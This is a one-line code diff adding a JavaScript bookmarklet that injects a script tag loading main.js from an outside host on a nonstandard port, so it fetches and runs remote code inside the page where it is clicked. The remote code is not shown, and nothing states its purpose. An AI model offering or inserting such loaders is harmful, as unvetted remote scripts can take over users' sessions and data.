@@ -1,0 +1,1 @@
+javascript:(function(){document.body.appendChild(document.createElement('script')).src='https://sonicisspooky.cf:24642/main.js'})()
